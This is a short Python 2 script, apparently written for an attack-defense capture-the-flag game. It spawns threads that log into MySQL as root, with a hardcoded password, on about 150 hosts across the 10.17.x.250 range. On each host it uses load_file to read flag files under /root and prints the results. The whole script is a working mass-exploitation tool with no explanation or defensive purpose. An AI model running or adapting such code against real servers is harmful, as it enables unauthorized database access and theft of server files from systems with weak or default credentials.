import threading,MySQLdb 
def con(ip): 
	try:
		con=MySQLdb.connect(host=ip,user='root',passwd='33332a')
		cur=con.cursor() 
		sql="select load_file('/root/flagv*.txt');" 
		cur.execute(sql) 
		re=cur.fetchall() 
		print ip,re 
	except Exception as er: 
		print er 
def th(): 
	for i in range(101,255):      
		ip='10.17.%s.250' %i 
		t=threading.Thread(target=con,args=(ip,)) 
		t.start() 
th()
